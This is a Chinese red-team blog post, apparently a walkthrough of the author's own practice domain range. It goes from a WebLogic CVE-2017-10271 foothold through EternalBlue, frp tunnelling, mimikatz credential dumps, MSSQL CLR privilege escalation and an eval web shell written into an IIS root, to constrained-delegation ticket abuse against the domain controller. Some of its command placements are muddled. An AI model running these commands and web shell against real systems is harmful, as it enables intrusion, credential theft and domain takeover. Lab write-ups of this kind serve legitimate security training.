@@ -1,0 +1,328 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ)
+
+渗透攻击红队
+
+一个专注于红队攻击的公众号
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)
+
+  
+
+  
+
+大家好，这里是 **渗透攻击红队** 的第 **78** 篇文章，本公众号会记录一些红队攻击的案例，不定时更新！请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关！
+
+  
+
+对于本星球的域渗透系列文章目前已更新完结：（接下来会更新其他系列文章，敬请期待）
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLtwWJwiaVzhCqkgiaxDicGGgMfTXtQlJaHfCQaCzFKQ05jrDfAAaasBHcA/640?wx_fmt=png)
+
+为了能让来星球学习的兄弟们有一个更好的学习环境，我搭建了一套域渗透靶场：  
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLicy3ecUPrHLAeG061nLFmW14Psy53h95sLHHJ9ICTITAogciaOUlp0QQ/640?wx_fmt=png)
+
+域控桌面下一个一个 Flag 文件，需要拿到即可通关。  
+
+PS：**本靶场下载地址在文章末尾，欢迎大家来打靶场，若靶场打通关并写了 WP 后可 @我，我从中抽取 5 个写的最好的 WP 的兄弟，赠送免费名额进知识星球。**
+
+**从外网 Weblogic 打到内网，再到约束委派接管域控**
+
+**外网打点之 Weblogic-CVE-2017-10271**
+
+首先拿到了目标的 IP：192.168.0.154，对该 IP 使用 Nmap 进行常规 TCP 端口扫描：
+
+```
+nmap -v -Pn -T3 -sV -n -sT --open -p 22,1222,2222,22345,23,21,445,135,139,5985,2121,3389,13389,6379,4505,1433,3306,5000,5236,5900,5432,1521,1099,53,995,8140,993,465,878,7001,389,902,1194,1080,88 192.168.0.154
+```
+
+在一般实战中建议制定端口扫描，因为速度快且扫描精度高：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLNbiaHlFH9byK8dMUosC6XAK1S0q3miaNyUZEHibMcvAV6ydibnElVu4JuQ/640?wx_fmt=png)
+
+发现开放了两个端口，其中有一个是 Weblogic 12：http://192.168.0.154:7001/console/login/LoginForm.jsp  
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL5iaHOheMk34V5z6F6NTBn8XHQFf6VAMTDC95A2sQTee8vlpGFy3H3icw/640?wx_fmt=png)
+
+通过信息搜集发现目标存在 CVE-2017-10271 反序列化漏洞：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLAP3HQ39vzFhzvyGX6mukQW4m1gvmxpCKq3Qe2uIaqPspxhPb1ogYaw/640?wx_fmt=png)
+
+且当前权限是一个 administrator 权限，而且出网：  
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLyUwRX78qLkiafUIQmHPZAu2iaiaK4upgLaEqY4D4ffT10yrR3l3ia3NxUw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLvHLgvJ77kHde4oBY1zmT960ooShfEsCkGCgNbyLfoTTGy9MRUJDQFw/640?wx_fmt=png)
+
+由于当前机器无 AV 直接上 Powershell 上线到 CobaltStrike：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLCaiaiaC6g26bp1ibv7K0tVAAWqVcibgr7mYob5R2ibnCqCQHRx7MvTZoFng/640?wx_fmt=png)
+
+  
+
+**工作组下的内网渗透**
+
+通过发现当前机器是有两个网卡，其中 10 是内网网卡，随后对当前机器进行抓密码：
+
+```
+WEBLOGIC\Administrator ccef208c6485269c20db2cad21734fe7
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLwSKxq5KpHMiaE9yeqTQ7dJoFP7gmY4664skjaxbYjgII0JCKvLLy7XA/640?wx_fmt=png)
+
+由于当前是 Windows 2012 所以无法抓到明文，先留着，由于是工作组环境，先对其 C 段进行信息搜集看看存活：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLjeaj4fHd6Q0pFCxticltMZc6ZFDU84mWkbicLFib6SyfupPAXKtLiaenOg/640?wx_fmt=png)
+
+发现内网有一台 Windows 7（10.10.20.7）应该是域机器。
+
+通过 fscan 也扫描出来存在永恒之蓝：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL86ePzQqRN1OV5ibVVJ821BCk9ghzT0DJia1jCcibs063wU9icjicRvvvGibw/640?wx_fmt=png)
+
+随后通过 Frp 建立一个 socks5 隧道，红队人员 VPS 配置文件 frps.ini，然后运行：
+
+```
+[common]
+bind_addr =0.0.0.0
+bind_port = 7000
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL0RcXczhbW179uNFr1d5uTetsN6jrOkpsWm9qckooY0OfV994NDFI2A/640?wx_fmt=png)
+
+之后来到目标跳板机器运行 frpc：
+
+```
+[common]
+server_addr = 192.168.0.175
+server_port = 7000
+[plugin_socks]
+type = tcp
+remote_port = 7777
+plugin = socks5
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLn5WnQibzVgDFydjgiaAISNccrdU731JqfjFribe7uuepQiboxd79tJ38OQ/640?wx_fmt=png)
+
+建立好 socks5 隧道后 Metasploit 对其利用拿到 Meterpreter 会话：
+
+```
+msf6 > setg Proxies socks5:192.168.0.175:7777
+msf6 > setg ReverseAllowProxy true
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > set payload windows/x64/meterpreter/bind_tcp
+msf6 > set rhost 10.10.20.7
+msf6 > run
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLRfCSXyEAUQiaSgZXzroOcicibd0ekJmEf1UGq2veiaKIjIMalV3NE1N3BA/640?wx_fmt=png)
+
+通过调用 mimikatz 成功抓到其域用户的密码：  
+
+```
+Username  Domain   Password
+--------  ------   --------
+saul      REDTEAM  admin!@#45
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL1ynVCVldHibve0yBXPoMaFawHLvD707cZxKbkfAJBwgI3FaRqSkmmKg/640?wx_fmt=png)
+
+```
+AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
+```
+
+**中转上线到 CobaltStrike 进行二层内网域渗透**
+
+因为此 Win7 不出网，随后只能通过 CobaltStrike 设置中转：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL6dQdgcpJ1Qfg1b5MGzl6ndbSvjZqwNrIQFRWj9cKTH6xzRbT0RvCcA/640?wx_fmt=png)
+
+然后成功上线到 CobaltStrike：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLFT2raAqy63qXvTiauNenG4a0QvqMFyiaQJrml7SnSNfJJOUo1nf204SQ/640?wx_fmt=png)
+
+通过信息搜集发现当前机器的确是在域环境：  
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLEJP5DM2jBJlWOGbXztavves78wdprzwRm65SDWQa4jTbtNZROyUe3Q/640?wx_fmt=png)
+
+随后定位到域控 DC IP 为：`10.10.10.8`
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLialJ6FhvuRV0FEM47XO6pZQB03yQiaiaficd1xkP4IkuNGu4ES7elEz7Wg/640?wx_fmt=png)
+
+想个办法拿到 DC，首先当前进程是没有域管的，所以暂且放弃令牌窃取：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLveOBkGILkxhWAhVP0p1vnOCHCNdPQnYaoRXs5mcg5AtnMuWX57jsyw/640?wx_fmt=png)
+
+由于我们已经拿到了一个域用户的账户密码，尝试查找约束委派的用户：  
+
+```
+SharpSQLTools.exe 10.10.10.18 sa sa master install_clr whoami
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLx2pbU1kQQkW6rVWxhqhTmTgFDnPqADDwttnhK2ybH4HNOmSyEO34WQ/640?wx_fmt=png)
+
+找到了一个 sqlserver 的用户是被设置了约束委派，得想办法搞到这个用户的账密。
+
+通过信息搜集发现 sqlserver 这台机器开放了 80、1433（mssql）：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL6usQXz5w1w0iabBm1ufcaP5703SmoJcLVwgf7IGANlXfZgpFDJ33nwQ/640?wx_fmt=png)
+
+通过一顿信息搜集没发现 80 有什么可利用的东西：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL0icvxaFrHtoqb526dRWxGLIDufQCNeHAeibgOmRYLQKnXV9KicJr7mfXA/640?wx_fmt=png)
+
+但是通过一波密码喷洒发现 mssql 数据库的密码是弱口令：  
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLZ0ibt0PyajibbcwI4ia0bkY3n1baewTbmdTicDpJvSgKggeb425IHOdPtw/640?wx_fmt=png)
+
+随后对其进行 xp_cmdshell 调用系统命令：  
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLpABia6iaNgdOnl0lKuicOqyu9qZV0t72aG2ID0TtdeqybibedUoQmXhpRw/640?wx_fmt=png)
+
+发现权限很小只是一个普通服务权限，由于目标机器不出网不存在让他下载我们的 exe，随后使用 MSF + Proxychains 调用 xpcmdshell 模块上线到 MSF，但是失败了：  
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLsqV2ibpYmyJf1NtoD2B7crht8xibicxLEXOS9y5fibO5vv5O5GZrvibicF6A/640?wx_fmt=png)
+
+既然上线失败且目标是 iis，那么想办法找到 iis 到目录写个一句话吧。  
+
+一般 iis 的目录是：`C:\inetpub\wwwroot`，那么查看下是否存在：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLEfZaKSQTeUC5ROVcJyJUowrHdUzEP3YGnyDv0DzzbFS4NJ3f3lt0Gg/640?wx_fmt=png)
+
+果然还是默认目录，接下来写个 txt 试试：  
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL8icDxic7RQs7O7ryFOpDET3n0y5PEQslhDaKFAvQJ3plNUtgVVUgD3cw/640?wx_fmt=png)
+
+不行权限太小了，这条路走不通。
+
+使用 SharpSQLTools 开启目标 clr：
+
+```
+SharpSQLTools.exe 10.10.10.18 sa sa master enable_clr
+SharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato whoami
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLJG9EVoZIfR0eBia3tb93ib8kT6zFF3Bg62N2n0ianps3pudMNE4Yyzs0w/640?wx_fmt=png)
+
+然后启用并调用命令：
+
+```
+echo ^<^%^@Page Language=^"^Jscript^"^%^>^<^%^eval(Request.Item^[^"saul^"^]^,^"unsafe^")^;^%^>>c:\inetpub\wwwroot\1.aspx
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLogia6meTdfy2LbkTibHGicgj76kzaCHxWGTMHIibCL0O52JiayTPCtyup9g/640?wx_fmt=png)
+
+这下子就是一个系统权限了！
+
+随后添加了一个管理员：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLPmFrLBkVI27AYmyheO5aXibibZrcluU7jwn4zViciaMzkNzKyWukxD9oqQ/640?wx_fmt=png)
+
+然后写文件也能写进去：  
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLeUSSsovKfQBHgFPrfpF4oMTQ35nWmgvWDORunmLVOCjvfFKuaQBUbg/640?wx_fmt=png)
+
+然后写了一个一句话进去：  
+
+```
+exploit/windows/mssql/mssql_clr_payload
+```
+
+发现都不行，还是用 MSF 把：
+
+```
+user : redteam\sqlserver
+pass : Server12345
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLv4KdyvHQODs1icBGCW7afQ9uZxnpOTqhkeu0vP3ujcehyyjKIGbHDicg/640?wx_fmt=png)
+
+然后找到了一个可读可写目录上传 exe 成功，然后中转再上线到 CobaltStrike：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLQK1PwnRw7TwCcicYmluFKCaIgQx6EWau6DaE6sJseC5LUjqxIofvpjw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLPeiccoo2n82tv4qfMcIMztL4mkzavPpF0YjGsAic6sictdXjrCKePrWqw/640?wx_fmt=png)
+
+权限太小了，用这个执行下：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLDHbDPrQF1VXbbCj3rYFDVwic5o8CosN6VPuUUI4RL1AfFsLgZp0Lnicw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLgrRmJiak7QuWhRU0Budic6W4pib3GHqu6TibOC6T9huuMGbph4Db2sHY8Q/640?wx_fmt=png)
+
+这个时候提权成功，然后抓到 sqlserver 的密码：
+
+```
+kekeo.exe "tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi"
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLo5JGqvqasavwQxrMib5LJfuoafpSC3gp5Rjib9RSehlia9KXUjbqcedBQ/640?wx_fmt=png)
+
+之前信息搜集的时候我们知道 `sqlserver` 是一个约束委派的用户，我们可以通过约束委派攻击来接管域控。
+
+**约束委派接管域控**
+
+利用 kekeo 请求该用户的 TGT：`TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi`  
+
+```
+kekeo.exe "tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red"
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL7e4ZtYyO22NDvSFUcdxYUAuPm9xgJsQGVnIP66lSkSNLpQs2180icJA/640?wx_fmt=png)
+
+然后使用这张 TGT (`TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi`) 获取域机器的 ST：`TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi`  
+
+```
+mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLaTR4zYMU244vmLfhYwe2YqLNHzIxRgwZf5yIOAJKs8zzMRAA0xJjmA/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNL1S5Ms7W8dRjUq4otKPiakRPvb2clM6u79Be9zJG29CfLFmiccB1sep8w/640?wx_fmt=png)
+
+使用 mimikatz 将 ST2 导入当前会话即可，运行 mimikatz 进行 ptt：  
+
+```
+mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi
+```
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLZD9WKb5iaO8U1hJ62TOdSKzCoOicVQfjB63B824NkpLxSONNgBWnibBTQ/640?wx_fmt=png)
+
+成功拿到域控权限：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLpajUOHIsTJmCEsFiaxC7s8GCick3bKlkdZHFv2csibHYp8uPOp6uuevRg/640?wx_fmt=png)
+
+最后也是成功拿到 Flag：
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLUbQKpILyJia3QalrGctUibibGEHiclwcZEHniaGKbpFMejBwrvU3qYRGoIQ/640?wx_fmt=png)
+
+* * *
+
+靶场下载地址：
+
+https://pan.baidu.com/s/1DOaDrsDsB2aW0sHSO_-fZQ 
+
+提取码: vbi2 
+
+![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  
+
+  
+
+渗透攻击红队
+
+一个专注于渗透红队攻击的公众号
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIemsQMiaSsp0F1vOvzHu19S6Xx3p9n8EEooYrRqvUK8YCGC0XZmsib3S21yLo5Ce7vBqM5Z5sB6dsg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)
+
+点分享
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)
+
+点点赞
+
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)
+
+点在看
